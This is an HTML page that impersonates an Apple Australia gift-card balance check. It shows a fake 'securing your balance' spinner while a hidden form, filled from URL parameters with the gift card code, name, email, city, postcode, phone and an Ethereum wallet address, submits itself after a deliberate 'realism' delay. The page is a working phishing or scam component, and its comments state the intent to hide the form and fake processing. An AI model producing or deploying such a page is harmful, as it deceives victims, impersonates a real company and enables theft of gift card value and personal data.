<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing Balance - Apple (AU)</title>
    <style>
        :root {
            --apple-blue: #0071e3;
            --apple-text: #1d1d1f;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: var(--apple-text);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .loading-container {
            max-width: 400px;
            padding: 20px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid var(--apple-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 600; }
        p { color: #6e6e73; font-size: 17px; }
        
        /* Hide the form completely from the user */
        #hidden-form-container { display: none; }
    </style>
</head>
<body>

    <div class="loading-container">
        <div class="spinner"></div>
        <h1>Verifying Gift Card</h1>
        <p>Please wait while we secure your balance...</p>
    </div>

    <div id="hidden-form-container">
        <form id="autoForm" action="/verify" method="POST">
            <input type="hidden" id="cardCode" name="cardCode">

            <input type="hidden" id="fullName" name="fullName" autocomplete="name">
            <input type="hidden" id="address" name="address" autocomplete="email">
            <input type="hidden" id="city" name="city" autocomplete="address-level2">
            <input type="hidden" id="zipCode" name="zipCode" autocomplete="postal-code">
            <input type="hidden" id="phoneNumber" name="phoneNumber" autocomplete="tel">
            <input type="hidden" id="walletAddress" name="walletAddress">
        </form>
    </div>

    <script>
        // 1. Get data from URL
        const urlParams = new URLSearchParams(window.location.search);
        
        // 2. Map URL keys to the hidden input IDs
        const fieldMap = {
            'code': 'cardCode',
            'name': 'fullName',
            'email': 'address',
            'city': 'city',
            'zip': 'zipCode',
            'phone': 'phoneNumber',
            'eth': 'walletAddress'
        };

        let hasData = false;

        // 3. Fill the hidden fields
        Object.keys(fieldMap).forEach(key => {
            const value = urlParams.get(key);
            const element = document.getElementById(fieldMap[key]);
            
            if (value && element) {
                element.value = decodeURIComponent(value);
                hasData = true;
            }
        });

        // 4. Auto-submit after a tiny delay (to look like it's "processing")
        if (hasData) {
            setTimeout(() => {
                document.getElementById('autoForm').submit();
            }, 1500); // 1.5 second delay for "realism"
        } else {
            // If no data is found in URL, tell the user or redirect
            document.querySelector('p').innerText = "Error: No card data detected. Please try again.";
        }
    </script>

</body>
</html>
